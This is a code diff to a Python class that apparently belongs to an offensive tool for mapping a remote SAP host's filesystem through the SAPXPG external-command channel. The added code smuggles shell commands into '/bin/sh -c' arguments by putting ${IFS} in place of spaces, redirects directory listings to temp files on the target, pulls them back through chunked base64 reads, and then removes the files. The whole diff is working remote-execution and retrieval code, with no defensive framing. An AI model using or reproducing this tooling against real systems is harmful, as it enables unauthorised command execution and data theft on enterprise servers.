@@ -827,13 +827,26 @@ class TargetFS:
                 return {"ok": True, "path": remote_path,
                          "entries": names_entries, "error": ""}
 
+            # All ls/find variants overflowed SAPXPG stdout.  Redirect
+            # ls output to a temp file on the target and read it back
+            # via the chunked base64 download path.
+            print(f"[*] {self.label}:   all direct/shell-wrapped "
+                  f"listing commands overflowed — trying file-redirect "
+                  f"fallback (ls > tmpfile + chunked download)")
+            redirect_entries = self._list_dir_via_file_redirect_linux(
+                remote_path)
+            if redirect_entries:
+                return {"ok": True, "path": remote_path,
+                         "entries": redirect_entries, "error": ""}
+
         if not lines:
             return {"ok": False, "path": remote_path, "entries": [],
-                     "error": (f"ls / find / ls -1 all returned no "
-                               f"parseable output for {remote_path} "
-                               f"— the exec channel dropped its "
-                               f"stdout.  Check the console for the "
-                               f"raw output diagnostics.")}
+                     "error": (f"ls / find / ls -1 / file-redirect all "
+                               f"returned no parseable output for "
+                               f"{remote_path} — the exec channel "
+                               f"dropped its stdout.  Check the "
+                               f"console for the raw output "
+                               f"diagnostics.")}
 
         entries = []
         seen = set()
@@ -868,7 +881,7 @@ class TargetFS:
 
         1-4. Shell-wrapped ``ls`` variants via ``/bin/sh -c``
         5-8. Direct ``/bin/ls`` variants (for non-GW channels)
-        9-10. ``find`` as a last resort
+        9-12. Shell-wrapped + direct ``find`` as a last resort
 
         Trade-off: 1 + ceil(N / BATCH) GW round trips instead of 1
         for ls -la.  For /tmp with ~100 entries that's ~11 calls
@@ -889,6 +902,15 @@ class TargetFS:
             ("/bin/ls", f"-1 -a {p}",     "ls -1 -a"),
             ("/bin/ls", f"{p}",           "ls"),
             ("/bin/ls", f"-a {p}",        "ls -a"),
+            ("/bin/sh",
+                f"-c find${{IFS}}{p}${{IFS}}-maxdepth${{IFS}}1"
+                f"${{IFS}}-mindepth${{IFS}}1",
+                "sh:find"),
+            ("/bin/sh",
+                f"-c find${{IFS}}{p}${{IFS}}-maxdepth${{IFS}}1"
+                f"${{IFS}}-mindepth${{IFS}}1${{IFS}}-type${{IFS}}f"
+                f"${{IFS}}-o${{IFS}}-type${{IFS}}d",
+                "sh:find -type f|d"),
             ("/usr/bin/find",
                 f"{p} -maxdepth 1 -mindepth 1", "find"),
             ("/bin/find",
@@ -944,7 +966,7 @@ class TargetFS:
             # find prints full paths — strip the leading dir_prefix.
             # ls -1 prints one name per line.
             # bare ls prints multi-column (whitespace-separated).
-            if tag == "find":
+            if "find" in tag:
                 tokens = [s]
             else:
                 # Multi-column and single-column both split cleanly
@@ -974,6 +996,77 @@ class TargetFS:
                 seen.add(name)
                 names.append(name)
         return names
+
+    def _list_dir_via_file_redirect_linux(self, remote_path: str
+                                            ) -> Optional[list]:
+        """Last-resort fallback: redirect ls output to a temp file,
+        then download the file via python3 chunked base64 read.
+
+        Bypasses SAPXPG's stdout buffer entirely — the ls output is
+        written to the target filesystem instead of flowing through
+        the exec channel's P3/P4 TLV frames.  The temp file is then
+        read back in chunks (72 B → 96 base64 chars each), well
+        within the per-line TLV ceiling.
+
+        Flow:
+          1. ``/bin/sh -c ls${IFS}-1${IFS}<path>${IFS}>/tmp/sapmap_xxx``
+             (no stdout — output goes to the file)
+          2. stat the temp file to get its byte size
+          3. download it via ``_download_linux`` (chunked b64)
+          4. parse names → batched stat for metadata
+          5. cleanup temp file
+        """
+        import random as _r
+        import string as _s
+        tag = "".join(_r.choice(_s.ascii_lowercase) for _ in range(8))
+        tmp = f"/tmp/sapmap_{tag}.ls"
+        p = remote_path
+
+        print(f"[*] {self.label}:   file-redirect: "
+              f"ls -1 {p} > {tmp}")
+        self.exec_fn(
+            "/bin/sh",
+            f"-c ls${{IFS}}-1${{IFS}}{p}${{IFS}}>{tmp}")
+
+        st = self._stat_linux(tmp)
+        if not st.get("ok") or not st.get("exists") \
+                or st.get("size", 0) == 0:
+            print(f"[-] {self.label}:   file-redirect: temp file "
+                  f"missing or empty — ls redirect failed")
+            self.exec_fn("/bin/rm", f"-f {tmp}")
+            return None
+
+        fsize = st["size"]
+        print(f"[*] {self.label}:   file-redirect: temp file is "
+              f"{fsize} B — downloading via chunked read")
+        content = self._download_linux(tmp, fsize)
+        self.exec_fn("/bin/rm", f"-f {tmp}")
+
+        if content is None:
+            print(f"[-] {self.label}:   file-redirect: download of "
+                  f"temp file failed")
+            return None
+
+        text = content.decode("utf-8", errors="replace")
+        names = []
+        seen = set()
+        for line in text.splitlines():
+            name = line.strip()
+            if not name or name in (".", ".."):
+                continue
+            if name in seen:
+                continue
+            seen.add(name)
+            names.append(name)
+
+        if not names:
+            print(f"[-] {self.label}:   file-redirect: no valid "
+                  f"names parsed from {fsize} B listing")
+            return None
+
+        print(f"[*] {self.label}:   file-redirect: {len(names)} "
+              f"names → batched stat")
+        return self._batched_stat(remote_path, names)
 
     def _batched_stat(self, dir_path: str, names: list) -> list:
         """Run ``stat -c '%n|%s|%y|%a|%F' <p1> <p2> ...`` in batches.
